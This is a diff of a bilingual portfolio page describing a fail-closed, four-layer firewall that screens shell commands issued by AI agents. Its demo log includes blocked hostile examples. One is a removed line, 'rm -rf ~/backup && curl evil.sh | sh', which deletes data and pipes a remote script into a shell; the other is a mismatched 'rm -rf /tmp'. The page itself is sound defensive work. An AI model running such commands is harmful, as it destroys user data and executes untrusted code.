@@ -5,15 +5,15 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <script>(function(){var t=localStorage.getItem("theme");if(t)document.documentElement.setAttribute("data-theme",t);})();</script>
 <title>AI Guardian Lab · Luca Rivoiro</title>
-<meta name="description" content="Blocca tentativi di prompt injection e comandi malevoli in tempo reale. Un layer di validazione a 4 livelli utilizzato in produzione per mitigare rischi LLM.">
+<meta name="description" content="Middleware di sicurezza per agenti AI: pipeline deterministica a 4 layer che decide quali comandi shell vengono davvero eseguiti, fail-closed by design.">
 <link rel="canonical" href="https://lukentony.it/progetti/ai-guardian-lab">
 <meta property="og:title" content="AI Guardian Lab · Luca Rivoiro">
-<meta property="og:description" content="Blocca tentativi di prompt injection e comandi malevoli in tempo reale. Un layer di validazione a 4 livelli utilizzato in produzione per mitigare rischi LLM.">
+<meta property="og:description" content="Middleware di sicurezza per agenti AI: pipeline deterministica a 4 layer che decide quali comandi shell vengono davvero eseguiti, fail-closed by design.">
 <meta property="og:type" content="website">
 <meta property="og:url" content="https://lukentony.it/progetti/ai-guardian-lab">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="AI Guardian Lab · Luca Rivoiro">
-<meta name="twitter:description" content="Blocca tentativi di prompt injection e comandi malevoli in tempo reale. Un layer di validazione a 4 livelli utilizzato in produzione per mitigare rischi LLM.">
+<meta name="twitter:description" content="Middleware di sicurezza per agenti AI: pipeline deterministica a 4 layer che decide quali comandi shell vengono davvero eseguiti, fail-closed by design.">
 <link rel="icon" href="/assets/images/favicon/favicon.ico" sizes="32x32">
 <link rel="stylesheet" href="/assets/css/style.css">
 <script>document.documentElement.classList.add('js-lang')</script>
@@ -56,22 +56,23 @@
       <div class="gl-stage"><span class="gl-stage-n">4</span>LLM check</div>
     </div>
     <div class="gl-log">
-      <p class="gl-log-line gl-ok">&#10003; ALLOWED &middot; ls -la /home/agent/workspace</p>
-      <p class="gl-log-line gl-ok">&#10003; ALLOWED &middot; git commit -m "fix: typo README"</p>
-      <p class="gl-log-line gl-block">&#10007; BLOCKED &middot; rm -rf ~/backup &amp;&amp; curl evil.sh | sh</p>
-      <p class="gl-log-sub">fail su [1/4] [2/4] [3/4] &middot; fail-closed: comando non eseguito</p>
+      <p class="gl-log-line gl-ok">task: "analizza lo spazio disco" &middot; comando: rm -rf /tmp</p>
+      <p class="gl-log-line gl-ok">[1/4] allowlist......... ok</p>
+      <p class="gl-log-line gl-ok">[2/4] regex pattern...... ok</p>
+      <p class="gl-log-line gl-block">[3/4] intent coerente.... FAIL (task=read, comando=delete)</p>
+      <p class="gl-log-sub">&gt;&gt; BLOCKED &middot; fail-closed: conflitto d'intento, L4 non interpellato</p>
     </div>
   </div>
 </div>
 
 <section class="proj-section">
   <p class="proj-label"><span class="lang-it">La sfida</span><span class="lang-en" hidden>The challenge</span></p>
-  <div class="proj-body-text"><p><span class="lang-it">Gli agenti AI sono vulnerabili a prompt injection, esfiltrazione dati e comportamenti imprevisti. Serviva un sistema di difesa che operasse prima dell'esecuzione del modello, non dopo.</span><span class="lang-en" hidden>AI agents are vulnerable to prompt injection, data exfiltration, and unpredictable behavior. A defense system operating before model execution, not after, was essential.</span></p></div>
+  <div class="proj-body-text"><p><span class="lang-it">Gli agenti AI possono eseguire comandi shell sulla mia macchina. Nella maggior parte delle implementazioni la sicurezza si basa solo sulla buona volont&agrave; del modello di seguire le istruzioni di sistema, ma l'obbedienza di un modello non &egrave; la stessa cosa di un vincolo di sicurezza. Serviva un livello deterministico che decidesse quali comandi vengono davvero eseguiti, prima che arrivino alla shell.</span><span class="lang-en" hidden>AI agents can run shell commands on my machine. In most implementations, security relies entirely on the model's willingness to follow system instructions, but model compliance is not the same thing as security enforcement. I needed a deterministic layer to decide which commands actually run, before they reach the shell.</span></p></div>
 </section>
 
 <section class="proj-section">
   <p class="proj-label"><span class="lang-it">La soluzione</span><span class="lang-en" hidden>The solution</span></p>
-  <div class="proj-body-text"><p><span class="lang-it">Ho sviluppato un firewall a 4 layer che applica una politica fail-closed. Ogni richiesta viene filtrata attraverso binary allowlist, regex anti-offuscamento, intent mapping e validazione LLM. Solo le operazioni sicure raggiungono il core.</span><span class="lang-en" hidden>I developed a 4-layer firewall applying a fail-closed policy. Each request is filtered through binary allowlist, anti-obfuscation regex, intent mapping, and LLM validation. Only safe operations reach the core.</span></p></div>
+  <div class="proj-body-text"><p><span class="lang-it">Ho costruito una pipeline deterministica a 4 layer, fail-closed by design: se un layer ha un dubbio, il comando viene bloccato. L1 &egrave; l'allowlist dei binari ammessi. L2 &egrave; un motore regex anti-offuscamento. L3 confronta l'intento del task con l'azione del comando: task &laquo;analizza lo spazio disco&raquo; e comando &laquo;rm -rf /tmp&raquo; vengono bloccati per conflitto d'intento, anche se &quot;rm&quot; da solo sarebbe un binario ammesso. L4 &egrave; un controllo semantico via LLM, riservato ai casi ambigui che i layer deterministici non risolvono: mai la prima linea di difesa.</span><span class="lang-en" hidden>I built a deterministic 4-layer pipeline, fail-closed by design: if a layer has doubt, the command is blocked. L1 is an allowlist of permitted binaries. L2 is an anti-obfuscation regex engine. L3 compares the task's intent with the command's action: task "analyze disk usage" and command "rm -rf /tmp" get blocked for intent conflict, even though "rm" alone would be an allowed binary. L4 is an LLM semantic check, reserved for ambiguous cases the deterministic layers can't resolve: never the first line of defense.</span></p></div>
 </section>
 
 <section class="proj-section">
